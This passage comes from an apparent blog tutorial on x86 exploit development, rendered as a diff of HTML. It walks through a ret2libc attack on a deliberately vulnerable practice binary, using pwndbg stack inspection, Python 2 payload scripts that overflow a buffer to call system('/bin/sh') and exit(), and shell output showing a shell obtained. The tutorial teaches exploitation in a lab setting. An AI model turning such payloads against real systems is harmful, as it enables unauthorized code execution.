+</span></span><span style="display:flex;"><span>   0x080491b0 &lt;+22&gt;:	add    eax,0x2e44
+</span></span><span style="display:flex;"><span>   0x080491b5 &lt;+27&gt;:	lea    edx,<span style="color:#f92672">[</span>eax-0x1fec<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x080491bb &lt;+33&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>ebp-0xc<span style="color:#f92672">]</span>,edx
+</span></span><span style="display:flex;"><span>   0x080491be &lt;+36&gt;:	lea    eax,<span style="color:#f92672">[</span>eax-0x1fe6<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x080491c4 &lt;+42&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>ebp-0x10<span style="color:#f92672">]</span>,eax
+</span></span><span style="display:flex;"><span>   0x080491c7 &lt;+45&gt;:	sub    esp,0x8
+</span></span><span style="display:flex;"><span>   0x080491ca &lt;+48&gt;:	push   DWORD PTR <span style="color:#f92672">[</span>ebp-0x10<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x080491cd &lt;+51&gt;:	push   DWORD PTR <span style="color:#f92672">[</span>ebp-0xc<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x080491d0 &lt;+54&gt;:	call   0x8049166 &lt;two_str&gt;
+</span></span><span style="display:flex;"><span>   0x080491d5 &lt;+59&gt;:	add    esp,0x10
+</span></span><span style="display:flex;"><span>   0x080491d8 &lt;+62&gt;:	mov    eax,0x0
+</span></span><span style="display:flex;"><span>   0x080491dd &lt;+67&gt;:	mov    ecx,DWORD PTR <span style="color:#f92672">[</span>ebp-0x4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x080491e0 &lt;+70&gt;:	leave
+</span></span><span style="display:flex;"><span>   0x080491e1 &lt;+71&gt;:	lea    esp,<span style="color:#f92672">[</span>ecx-0x4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x080491e4 &lt;+74&gt;:	ret
+</span></span></code></pre></div><p>At instructions <code>+48</code> and <code>+51</code>, you can see that pointers to the strings are pushed onto the stack.</p>
+<p>Let’s set a breakpoint at <code>0x080491d0</code> (i.e., <code>*main + 54</code>) and run the program:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; b *0x080491d0
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x80491d0
+</span></span><span style="display:flex;"><span>pwndbg&gt; run
+</span></span></code></pre></div><p>Now, let’s examine the stack right before we call two_str:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; x/2wx $sp
+</span></span><span style="display:flex;"><span>0xffffd5d0:	0x0804a008	0x0804a00e
+</span></span><span style="display:flex;"><span>pwndbg&gt; x/s 0x0804a008
+</span></span><span style="display:flex;"><span>0x804a008:	<span style="color:#e6db74">&#34;hello&#34;</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; x/s 0x0804a00e
+</span></span><span style="display:flex;"><span>0x804a00e:	<span style="color:#e6db74">&#34;world&#34;</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; stack <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>00:0000│ esp 0xffffd5d0 —▸ 0x804a008 ◂— <span style="color:#e6db74">&#39;hello&#39;</span>
+</span></span><span style="display:flex;"><span>01:0004│-024 0xffffd5d4 —▸ 0x804a00e ◂— <span style="color:#e6db74">&#39;world&#39;</span>
+</span></span></code></pre></div><p>You can see that the pointer to the string <code>world</code> is pushed before the pointer to the string <code>hello</code>.</p>
+<p>Now, let’s continue to the function call:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; b *0x8049166
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">2</span> at 0x8049166
+</span></span><span style="display:flex;"><span>pwndbg&gt; c
+</span></span></code></pre></div><p>When we print the stack now, we see that the top of the stack points to the return address <code>0x080491d5</code> (i.e., <code>*main+59</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; stack <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>00:0000│ esp 0xffffd5cc —▸ 0x80491d5 <span style="color:#f92672">(</span>main+59<span style="color:#f92672">)</span> ◂— add esp, 0x10
+</span></span><span style="display:flex;"><span>01:0004│-028 0xffffd5d0 —▸ 0x804a008 ◂— <span style="color:#e6db74">&#39;hello&#39;</span>
+</span></span><span style="display:flex;"><span>02:0008│-024 0xffffd5d4 —▸ 0x804a00e ◂— <span style="color:#e6db74">&#39;world&#39;</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; x/3wx $esp
+</span></span><span style="display:flex;"><span>0xffffd5cc:	0x080491d5	0x0804a008	0x0804a00e
+</span></span></code></pre></div><p>I hope now you understood what happens when we call a function with arguments.</p>
+<p>Now, following picture will clear your understanding on <code>ret2libc</code></p>
+<p><img src="/images/exp-dev/ret2libc.png" alt="ret2libc"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># exp3.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf7d5f000</span>
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x524c0</span>
+</span></span><span style="display:flex;"><span>bin_sh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c9e3c</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>,system) <span style="color:#75715e"># EIP -&gt; system</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>,<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># return address</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>,bin_sh) <span style="color:#75715e"># arg -&gt; /bin/sh</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span></code></pre></div><p>For easy understanding I&rsquo;ve used <code>0xdeadbeef</code> as return address where we should land after executing <code>system(&quot;/binsh&quot;)</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./exp2_nx <span style="color:#66d9ef">$(</span>./exp3.py<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>$ pwd
+</span></span><span style="display:flex;"><span>/home/kali/Desktop/Blogs/Materials/x86_exp_dev/02
+</span></span></code></pre></div><p>As you can see we got shell :)</p>
+<p>But let&rsquo;s exit from the shell see what happens.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./exp2_nx <span style="color:#66d9ef">$(</span>./exp3.py<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>$ pwd
+</span></span><span style="display:flex;"><span>/home/kali/Desktop/Blogs/Materials/x86_exp_dev/02
+</span></span><span style="display:flex;"><span>$ exit
+</span></span><span style="display:flex;"><span>Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>As you can see we got segfault. Let&rsquo;s examine the core dump.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb -core core
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>──────────────────<span style="color:#f92672">[</span> REGISTERS / show-flags off / show-compact-regs off <span style="color:#f92672">]</span>──────────────────
+</span></span><span style="display:flex;"><span> EAX  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> EBX  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> ECX  0xffffd2d4 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> EDX  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> EDI  0xf7ffcb60 ◂— <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> ESI  0xffffd6c0 —▸ 0xffffd8de ◂— <span style="color:#e6db74">&#39;SHELL=/usr/bin/bash&#39;</span>
+</span></span><span style="display:flex;"><span> EBP  0x41414141 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAA&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> ESP  0xffffd5d4 —▸ 0xf7f28e3c ◂— <span style="color:#e6db74">&#39;/bin/sh&#39;</span>
+</span></span><span style="display:flex;"><span> EIP  0xdeadbeef
+</span></span><span style="display:flex;"><span>────────────────────────────<span style="color:#f92672">[</span> DISASM / i386 / set emulate on <span style="color:#f92672">]</span>────────────────────────────
+</span></span><span style="display:flex;"><span>Invalid address 0xdeadbeef
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>As you can see we landed on invalid address.</p>
+<p>For landing on safe address we will use <code>exit()</code> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nm -D /usr/lib32/libc.so.6 | grep exit
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0003eac0 T exit@@GLIBC_2.0
+</span></span></code></pre></div><p>We can verify this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; xinfo exit
+</span></span><span style="display:flex;"><span>Extended information <span style="color:#66d9ef">for</span> virtual address 0xf7d9dac0:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Containing mapping:
+</span></span><span style="display:flex;"><span>0xf7d82000 0xf7f0e000 r-xp   18c000  <span style="color:#ae81ff">23000</span> /usr/lib32/libc.so.6
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Offset information:
+</span></span><span style="display:flex;"><span>         Mapped Area 0xf7d9dac0 <span style="color:#f92672">=</span> 0xf7d82000 + 0x1bac0
+</span></span><span style="display:flex;"><span>         File <span style="color:#f92672">(</span>Base<span style="color:#f92672">)</span> 0xf7d9dac0 <span style="color:#f92672">=</span> 0xf7d5f000 + 0x3eac0
+</span></span><span style="display:flex;"><span>      File <span style="color:#f92672">(</span>Segment<span style="color:#f92672">)</span> 0xf7d9dac0 <span style="color:#f92672">=</span> 0xf7d82000 + 0x1bac0
+</span></span><span style="display:flex;"><span>         File <span style="color:#f92672">(</span>Disk<span style="color:#f92672">)</span> 0xf7d9dac0 <span style="color:#f92672">=</span> /usr/lib32/libc.so.6 + 0x3eac0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Containing ELF sections:
+</span></span><span style="display:flex;"><span>               .text 0xf7d9dac0 <span style="color:#f92672">=</span> 0xf7d821c0 + 0x1b900
+</span></span></code></pre></div><p>Here’s our exploit to perform ret2libc:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># exp3.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf7d5f000</span>
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x524c0</span>
+</span></span><span style="display:flex;"><span>bin_sh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c9e3c</span>
+</span></span><span style="display:flex;"><span>exit_func <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3eac0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>,system) <span style="color:#75715e"># EIP -&gt; system</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload += struct.pack(&#34;&lt;I&#34;,0xdeadbeef) # return address</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>,exit_func) <span style="color:#75715e"># return address</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>,bin_sh) <span style="color:#75715e"># arg -&gt; /bin/sh</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span></code></pre></div><p>By replacing <code>0xdeadbeef</code> with a valid <code>exit</code> function address, we ensure the process exits gracefully instead of crashing.😊</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./exp2_nx <span style="color:#66d9ef">$(</span>./exp3.py<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>$ pwd
+</span></span><span style="display:flex;"><span>/home/kali/Desktop/Blogs/Materials/x86_exp_dev/02
+</span></span><span style="display:flex;"><span>$ exit
+</span></span><span style="display:flex;"><span>echo $?
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>In Linux, the command <code>echo $?</code> is used to print the exit status of the last executed command.</p>
+<p><strong>Extra Info:</strong></p>
+<p>What if we want the exit status to be 255?</p>
+<p>To set the exit status to 255, which in hexadecimal is represented as 0xFF, we can add 0xff as an argument to <code>exit()</code> right after the pointer to the string <code>&quot;/bin/sh&quot;</code>.</p>
+<p><img src="/images/exp-dev/ret2libc2.png" alt="ret2libc"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># exp3.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf7d5f000</span>
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x524c0</span>
+</span></span><span style="display:flex;"><span>bin_sh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c9e3c</span>
+</span></span><span style="display:flex;"><span>exit_func <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3eac0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>,system) <span style="color:#75715e"># EIP -&gt; system</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload += struct.pack(&#34;&lt;I&#34;,0xdeadbeef) # return address</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>,exit_func) <span style="color:#75715e"># return address</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>,bin_sh) <span style="color:#75715e"># arg -&gt; /bin/sh</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>,<span style="color:#ae81ff">0xff</span>) <span style="color:#75715e"># exit status</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(payload)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./exp2_nx <span style="color:#66d9ef">$(</span>./exp3.py<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>bash: warning: command substitution: ignored null byte in input
+</span></span><span style="display:flex;"><span>$ pwd
+</span></span><span style="display:flex;"><span>/home/kali/Desktop/Blogs/Materials/x86_exp_dev/02
+</span></span><span style="display:flex;"><span>$ exit
+</span></span><span style="display:flex;"><span>echo $?
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">255</span>
+</span></span></code></pre></div><p>This way, we can control the exit status directly through our payload.</p>
+
     </div>
 </div>
 </main>
